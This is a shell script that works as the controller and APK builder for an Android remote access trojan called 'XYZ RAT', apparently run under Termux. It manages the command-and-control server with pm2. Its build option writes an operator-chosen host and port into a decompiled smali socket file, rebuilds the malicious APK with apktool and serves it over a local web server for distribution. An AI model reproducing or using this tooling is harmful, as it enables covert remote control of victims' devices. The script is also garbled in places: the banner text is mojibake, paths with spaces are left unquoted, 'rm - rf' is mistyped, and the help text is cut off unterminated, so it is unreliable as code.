IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan


#############################################################
# Start
#############################################################
if [ "$1" == "start" ]
then
	cd $PREFIX/share/XYZ RAT/server
	pm2 start index.js -s
	printf "${IGreen}    [âœ”] ğ™“ğ™”ğ™• ğ™ğ˜¼ğ™ ğ™ğ™©ğ™–ğ™§ğ™©ğ™šğ™™  \n" | pv -qL 30

#############################################################
# Stop
#############################################################
elif [ "$1" == "stop" ]
then
	cd $PREFIX/share/XYZ RAT/server
	pm2 stop index.js -s
	printf "${IRed}    [âœ˜] ğ™“ğ™”ğ™• ğ™ğ˜¼ğ™ ğ™ğ™©ğ™¤ğ™¥ğ™šğ™™\n" | pv -qL 30


#############################################################
# Restart
#############################################################
elif [ "$1" == "restart" ] 
then
	cd $PREFIX/share/XYZ RAT/server
	pm2 restart index.js -s
	printf "${IPurple}    [âœ”] ğ™“ğ™”ğ™• ğ™ğ˜¼ğ™ ğ—¥ğ—²ğ˜€ğ˜ğ—®ğ—¿ğ˜ğ—²ğ—±\n" | pv -qL 30

#############################################################
# Build
#############################################################
elif [ "$1" == "build" ]
then
	smaliFile="smali/com/etechd/xyzrat/IOSocket.smali"
	if [ -d $PREFIX/share/XYZ RAT ]; then
		appPath="$PREFIX/share/XYZ RAT/server/app/factory/decompiled"
	fi
	printf "${ICyan}"
	read -p "    [âœ¯] ğ—›ğ—¼ğ˜€ğ˜ â§ " host
	read -p "    [âœ¯] ğ—£ğ—¼ğ—¿ğ˜ â§ " port
	sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
	apktool b "$appPath" -o $PREFIX/share/XYZ RAT/XYZ RAT.apk > /dev/null 2>&1 
	printf "${IGreen}    [âœ”] ğ—”ğ—½ğ—¸ ğ—•ğ˜‚ğ—¶ğ—¹ğ—± ğ—¦ğ˜‚ğ—°ğ—°ğ—²ğ˜€ğ˜€ğ—³ğ˜‚ğ—¹\n" | pv -qL 30
	cd $PREFIX/share/XYZ RAT
	pkill php
	php -S localhost:8080 > /dev/null 2>&1 &
	sleep 5
	termux-open-url http://localhost:8080
	printf "${IGreen}\n"
	read -p "              ğ™‹ğ™§ğ™šğ™¨ğ™¨ ğ™€ğ™£ğ™©ğ™šğ™§ ğ™ğ™¤ğ™§ ğ™ğ™©ğ™¤ğ™¥ " nothing
	sleep 2
	pkill php
	rm -rf XYZ RAT.apk




#############################################################
# Bind 
#############################################################

elif [ "$1" == "bind" ]
then
	printf "${ICyan} [â˜…] ğ‘¨ğ’…ğ’…ğ’†ğ’… ğ‘ºğ’ğ’ğ’ ğ‘»ğ’‰ğ’Šğ’” ğ‘¶ğ’‘ğ’•ğ’Šğ’ğ’ ${clear}\n" | pv -qL 30


#############################################################
# Clean
#############################################################
elif [ "$1" == "clean" ]
then

	if [ -e $PREFIX/share/XYZ RAT/maindb.json ]
	then
		rm - rf $PREFIX/share/XYZ RAT/maindb.json
	else
		pm2 restart $PREFIX/share/XYZ RAT/index.js -s
	fi
	printf " ${ICyan}   [âœ”] ğ‚ğ¥ğğšğ§  ğ’ğ®ğœğœğğ¬ğ¬ğŸğ®ğ¥ \n" | pv -qL 30

#############################################################
# Help
#############################################################
elif [ "$1" == "-h" ]
then
	l="${ICyan}â§${clear}"
	o="${IGreen}"
	printf "
	$l $o xyzrat password\n
	$l $o xyzrat start\n
	$l $o xyzrat stop\n
	$l $o xyzrat restart\n
	$l $o xyzrat build\n
	$l $o xyzrat bind (Soon)\n
	$l $o xyzrat -h (help)\n
